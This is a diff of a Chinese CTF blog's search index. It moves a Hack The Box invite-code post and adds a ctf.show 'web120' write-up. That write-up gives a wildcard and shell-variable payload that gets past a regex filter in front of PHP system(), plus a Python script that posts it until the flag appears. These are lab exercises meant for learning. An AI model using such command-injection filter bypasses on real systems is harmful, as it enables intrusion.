@@ -169,6 +169,34 @@
       </tags>
   </entry>
   <entry>
+    <title>Hack The Box账号注册</title>
+    <url>/posts/33946/</url>
+    <content><![CDATA[<h2 id="引言"><a class="header-anchor" href="#引言">¶</a>引言</h2>
+<p>hack the box 是一个很有趣也很强大的网站，开始接触的时候就被里面的元素给吸引到了，同时，网站的注册也是让人能忍不住动手去探索一下，下面分享一下过程。</p>
+<h2 id="正文"><a class="header-anchor" href="#正文">¶</a>正文</h2>
+<p>打开网站注册的时候，提示需要自己入侵网站获取注册</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/psc.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/13.jpg" alt=""></p>
+<p>在下面的clickhere提示我们需要打开控制台查看，于是打开控制台，发现一个可疑的js文件，js文件带有inviteapi名字</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/132165.png" alt=""></p>
+<p>跑去查看js文件源码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/894.png" alt=""></p>
+<p>发现function，console，log等关键字，可以猜测后面makeInviteCode是一个方法，需要我们在控制台打印，然后我们溜去控制台试试~</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/165123.png" alt=""></p>
+<p>给出一串数据，还提示我们是rot13密文加密方式，于是我们去解解看</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string  </span><br><span class="line"> </span><br><span class="line">upperdict = &#123;&#125;  </span><br><span class="line">lowerdict = &#123;&#125;  </span><br><span class="line">upperletters =string.ascii_uppercase</span><br><span class="line">lowerletters =string.ascii_lowercase<span class="comment">#：所有小写字母</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">dststr = []  </span><br><span class="line">oristr = input(<span class="string">&#x27;Enter string to rot13:&#x27;</span>)<span class="comment">#版本3.0不能用raw_input</span></span><br><span class="line">print(<span class="string">&#x27;Your string ro en/crypt was :&#x27;</span>,oristr ) </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(lowerletters)):                       <span class="comment">#把所有小写字母转为rot13  </span></span><br><span class="line">	<span class="keyword">if</span> i&lt;<span class="number">13</span>:  </span><br><span class="line">		lowerdict[lowerletters[i]] = lowerletters[i+<span class="number">13</span>]  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		lowerdict[lowerletters[i]] = lowerletters[i<span class="number">-13</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(upperletters)):                       <span class="comment">#把所有大写字母转为rot13  </span></span><br><span class="line">	<span class="keyword">if</span> i&lt;<span class="number">13</span>:  </span><br><span class="line">		lowerdict[upperletters[i]] = upperletters[i+<span class="number">13</span>]  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		lowerdict[upperletters[i]] = upperletters[i<span class="number">-13</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> oristr:  </span><br><span class="line">	<span class="keyword">if</span> ch <span class="keyword">in</span> lowerdict:  </span><br><span class="line">		dststr.append(lowerdict[ch])  </span><br><span class="line">	<span class="keyword">elif</span> ch <span class="keyword">in</span> upperdict:  </span><br><span class="line">		dststr.append(upperdict[ch])  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		dststr.append(ch)  </span><br><span class="line">dststr = <span class="string">&#x27;&#x27;</span>.join(dststr)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">print(<span class="string">&#x27;the rot13 string is:&#x27;</span>,dststr ) </span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/sff2132.png" alt=""></p>
+<p><strong>解密结果：</strong></p>
+<p>In order to generate the invite code, make a POST request to /api/invite/generate</p>
+<p>要想获得注册邀请码，必须使用post方式向此处地址发送请求获取，于是我们马不停蹄得溜去发送请求~~</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/1231321.png" alt=""></p>
+<p>返回一段被base64方式加密的密文，我们再次跑去解密base64</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">str=<span class="string">&quot;SElNRFctSURTRUwtQkZUVEQtTFBJUkQtSFlTWUI=&quot;</span></span><br><span class="line"></span><br><span class="line">temp = base64.b64decode(str)</span><br><span class="line"></span><br><span class="line">print(temp.decode())</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/12315131.png" alt=""></p>
+<p>这下子看起来没有问题了，我们可以愉快的拿着邀请码去注册了！！！</p>
+]]></content>
+  </entry>
+  <entry>
     <title>php-md5类型题目汇总</title>
     <url>/posts/16813/</url>
     <content><![CDATA[<h1>前言</h1>
@@ -284,34 +312,6 @@ is_numeric()：   用于检测变量是否为数字或数字字符串</p>
       <tags>
         <tag>ctf</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hack The Box账号注册</title>
-    <url>/posts/33946/</url>
-    <content><![CDATA[<h2 id="引言"><a class="header-anchor" href="#引言">¶</a>引言</h2>
-<p>hack the box 是一个很有趣也很强大的网站，开始接触的时候就被里面的元素给吸引到了，同时，网站的注册也是让人能忍不住动手去探索一下，下面分享一下过程。</p>
-<h2 id="正文"><a class="header-anchor" href="#正文">¶</a>正文</h2>
-<p>打开网站注册的时候，提示需要自己入侵网站获取注册</p>
-<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/psc.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/13.jpg" alt=""></p>
-<p>在下面的clickhere提示我们需要打开控制台查看，于是打开控制台，发现一个可疑的js文件，js文件带有inviteapi名字</p>
-<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/132165.png" alt=""></p>
-<p>跑去查看js文件源码</p>
-<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/894.png" alt=""></p>
-<p>发现function，console，log等关键字，可以猜测后面makeInviteCode是一个方法，需要我们在控制台打印，然后我们溜去控制台试试~</p>
-<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/165123.png" alt=""></p>
-<p>给出一串数据，还提示我们是rot13密文加密方式，于是我们去解解看</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string  </span><br><span class="line"> </span><br><span class="line">upperdict = &#123;&#125;  </span><br><span class="line">lowerdict = &#123;&#125;  </span><br><span class="line">upperletters =string.ascii_uppercase</span><br><span class="line">lowerletters =string.ascii_lowercase<span class="comment">#：所有小写字母</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">dststr = []  </span><br><span class="line">oristr = input(<span class="string">&#x27;Enter string to rot13:&#x27;</span>)<span class="comment">#版本3.0不能用raw_input</span></span><br><span class="line">print(<span class="string">&#x27;Your string ro en/crypt was :&#x27;</span>,oristr ) </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(lowerletters)):                       <span class="comment">#把所有小写字母转为rot13  </span></span><br><span class="line">	<span class="keyword">if</span> i&lt;<span class="number">13</span>:  </span><br><span class="line">		lowerdict[lowerletters[i]] = lowerletters[i+<span class="number">13</span>]  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		lowerdict[lowerletters[i]] = lowerletters[i<span class="number">-13</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(upperletters)):                       <span class="comment">#把所有大写字母转为rot13  </span></span><br><span class="line">	<span class="keyword">if</span> i&lt;<span class="number">13</span>:  </span><br><span class="line">		lowerdict[upperletters[i]] = upperletters[i+<span class="number">13</span>]  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		lowerdict[upperletters[i]] = upperletters[i<span class="number">-13</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> oristr:  </span><br><span class="line">	<span class="keyword">if</span> ch <span class="keyword">in</span> lowerdict:  </span><br><span class="line">		dststr.append(lowerdict[ch])  </span><br><span class="line">	<span class="keyword">elif</span> ch <span class="keyword">in</span> upperdict:  </span><br><span class="line">		dststr.append(upperdict[ch])  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		dststr.append(ch)  </span><br><span class="line">dststr = <span class="string">&#x27;&#x27;</span>.join(dststr)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">print(<span class="string">&#x27;the rot13 string is:&#x27;</span>,dststr ) </span><br></pre></td></tr></table></figure>
-<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/sff2132.png" alt=""></p>
-<p><strong>解密结果：</strong></p>
-<p>In order to generate the invite code, make a POST request to /api/invite/generate</p>
-<p>要想获得注册邀请码，必须使用post方式向此处地址发送请求获取，于是我们马不停蹄得溜去发送请求~~</p>
-<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/1231321.png" alt=""></p>
-<p>返回一段被base64方式加密的密文，我们再次跑去解密base64</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">str=<span class="string">&quot;SElNRFctSURTRUwtQkZUVEQtTFBJUkQtSFlTWUI=&quot;</span></span><br><span class="line"></span><br><span class="line">temp = base64.b64decode(str)</span><br><span class="line"></span><br><span class="line">print(temp.decode())</span><br></pre></td></tr></table></figure>
-<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/12315131.png" alt=""></p>
-<p>这下子看起来没有问题了，我们可以愉快的拿着邀请码去注册了！！！</p>
-]]></content>
   </entry>
   <entry>
     <title>模拟网站攻击到提权的全部过程</title>
@@ -2392,10 +2392,10 @@ strings</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, $c))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.$c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这题不仅过滤了字母数字，还把通配符都给过滤了。查了一下资料，发现在shell中可以利用<code>$</code>和<code>()</code>进行构造数字，而这道题提示flag在36.php中，system中已经写好cat和php，所以我们只需要构造出36即可</p>
 <blockquote>
-<p>$(())                  							代表做一次运算，因为里面为空，也表示值为0<br>
-$((~$(())))         							对0作取反运算，值为1<br>
-$(($((<sub>$(())))$((</sub>$(())))))         	  (-1)+(-1)为-2，所以值为-2<br>
-$((<sub>$(($((</sub>$(())))$((~$(())))))))      再对-2做一次取反得到1，所以值为1</p>
+<p><code>$(())</code>                  									 代表做一次运算，因为里面为空，也表示值为0<br>
+<code>$((~$(())))</code>         									对0作取反运算，值为1<br>
+<code>$(($((~$(())))$((~$(())))))</code>  	      	 (-1)+(-1)为-2，所以值为-2<br>
+<code>$((~$(($((~$(())))$((~$(())))))))</code>       再对-2做一次取反得到1，所以值为1</p>
 <p>如果对取反不了解可以百度一下，这里给个容易记得式子，如果对a按位取反，则得到的结果为-(a+1)，也就是对0取反得到1</p>
 </blockquote>
 <p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/CHH1%24IQ%40EBHL5L%2877%5B%40%251OP.png" alt=""><br>
@@ -2564,6 +2564,27 @@ exp：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span><br></pre></td></tr></table></figure>
 <p>回车后右键源码看到flag<br>
 <img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web119/~V_%29Z5%7D%284%247%401WZ%5BKKT_KPC.png" alt=""></p>
+<h3 id="web120"><a class="header-anchor" href="#web120">¶</a>web120</h3>
+<p>这次变成源码了</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code=$_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, $code))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen($code)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system($code).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这次限制payload长度在65以内，上题我们payload达到99的长度，所以我们适当减少一下，我们就不取www-data中的at，只取a进行匹配，好家伙那我上题还想半天构造数字2(太菜了)，尝试构造如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br></pre></td></tr></table></figure>
+<p>发现长度是66还是超了，接着我们把$`分别替代</p>
+<blockquote>
+<p>$<code>了，这里使用</code>$?`</p>
+</blockquote>
+<blockquote>
+<p>$? 最后运行的命令的结束代码（返回值）即执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)</p>
+</blockquote>
+<p>这里找了几个报错资料和对应的值</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;OS error code   1:  Operation not permitted&quot;</span><br><span class="line">&quot;OS error code   2:  No such file or directory&quot;</span><br><span class="line">&quot;OS error code   3:  No such process&quot;</span><br><span class="line">&quot;OS error code   4:  Interrupted system call&quot;</span><br><span class="line">&quot;OS error code   5:  Input&#x2F;output error&quot;</span><br><span class="line">&quot;OS error code   6:  No such device or address&quot;</span><br><span class="line">&quot;OS error code   7:  Argument list too long&quot;</span><br><span class="line">&quot;OS error code   8:  Exec format error&quot;</span><br><span class="line">&quot;OS error code   9:  Bad file descriptor&quot;</span><br><span class="line">&quot;OS error code  10:  No child processes&quot;</span><br></pre></td></tr></table></figure>
+<p>利用<code>&lt;A</code>的报错就能返回值1，根据题目fuzz提示，后面的base64中的4我们可以利用<code>$&#123;RANDOM&#125;</code>来获得(因为具有随机性，所以要多尝试直到随机出4来)，到这里思路很清晰了，构造paylaod</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br></pre></td></tr></table></figure>
+<p>写个脚本来跑</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/19 12:17</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3f405f9a-8ca5-4519-aef8-95943df5d5de.chall.ctf.show:8080/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="string">r&#x27;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    result = requests.post(url=url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;PD9waHA&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">        print(result.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web122/D%40_HYTR%28%5B9%7D6%29KJBT45VBDF.png" alt=""><br>
+再进行base64解码即可得到flag</p>
+<h3 id="web124"><a class="header-anchor" href="#web124">¶</a>web124</h3>
 ]]></content>
       <tags>
         <tag>CTF</tag>
